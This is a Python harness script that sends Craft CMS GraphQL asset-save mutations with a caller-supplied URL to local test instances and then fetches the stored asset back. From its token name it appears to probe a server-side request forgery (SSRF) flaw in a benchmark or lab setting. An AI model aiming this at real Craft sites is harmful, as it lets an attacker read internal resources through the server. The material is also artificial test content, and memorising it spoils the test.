#!/usr/bin/env python3
"""Drive Craft CMS GraphQL save_<Volume>_Asset(_file.url) against the live app.

Usage: python3 seed_exec.py <candidate.json> [version]
"""
from __future__ import annotations

import json
import os
import secrets
import sys
import time
import urllib.error
import urllib.request
from urllib.parse import urlparse, urlunparse

GQL_TOKEN = os.environ.get("PCB_GQL_TOKEN") or "pcb_gql_token_ssrf_toctou_0001"
VOLUME_HANDLE = "pcbvol"
GQL_PATH = "/index.php?p=actions/graphql/api"
BASE = {
    "v0": "http://127.0.0.1:39520",
    "v1": "http://127.0.0.1:39521",
    "v2": "http://127.0.0.1:39522",
}


def _apply_port_overrides() -> None:
    pbt = os.environ.get("PCB_TARGET_BASE")
    if pbt:
        for v in list(BASE):
            BASE[v] = pbt
    pt = os.environ.get("PCB_TARGET_PORT")
    if pt:
        for v in list(BASE):
            BASE[v] = f"http://127.0.0.1:{int(pt)}"


def _http(url: str, *, data: bytes | None = None, headers: dict | None = None, timeout: int = 30):
    req = urllib.request.Request(url, data=data, headers=headers or {}, method="POST" if data else "GET")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return None, f"<http-error: {e}>"


def _graphql(base: str, query: str, timeout: int = 60):
    body = json.dumps({"query": query}).encode()
    return _http(
        f"{base}{GQL_PATH}",
        data=body,
        headers={
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Authorization": f"Bearer {GQL_TOKEN}",
        },
        timeout=timeout,
    )


def _rewrite_asset_url(asset_url: str, base: str) -> str:
    """Fetch via the live published host port even if Craft baked a stale port into the asset URL."""
    if not asset_url:
        return asset_url
    au = urlparse(asset_url)
    bu = urlparse(base)
    if au.hostname in ("127.0.0.1", "localhost") and bu.port:
        netloc = f"{bu.hostname or '127.0.0.1'}:{bu.port}"
        return urlunparse((au.scheme or "http", netloc, au.path, au.params, au.query, au.fragment))
    return asset_url


def run_probe(candidate, *, version="v1"):
    base = BASE[version]
    url = candidate["url"] if isinstance(candidate, dict) else str(candidate)
    fname = f"pcb_{secrets.token_hex(6)}.txt"
    mutation = (
        "mutation { save_%s_Asset(_file:{url:%s, filename:%s}) { id url filename } }"
        % (VOLUME_HANDLE, json.dumps(url), json.dumps(fname))
    )
    status, gql_body = None, ""
    for attempt in range(5):
        status, gql_body = _graphql(base, mutation)
        if status is not None:
            break
        time.sleep(2)

    asset_url = None
    fetched_body = ""
    try:
        parsed = json.loads(gql_body)
    except Exception:
        parsed = None
    if isinstance(parsed, dict):
        node = (((parsed.get("data") or {}).get(f"save_{VOLUME_HANDLE}_Asset")) or {})
        asset_url = node.get("url")

    if asset_url:
        fetch_url = _rewrite_asset_url(asset_url, base)
        _st, fetched_body = _http(fetch_url, timeout=20)

    return {
        "version": version,
        "url": url,
        "mutation": mutation,
        "graphql_status": status,
        "graphql_body": gql_body[:2000],
        "asset_url": asset_url,
        "fetched_body": fetched_body,
    }


if __name__ == "__main__":
    _apply_port_overrides()
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))
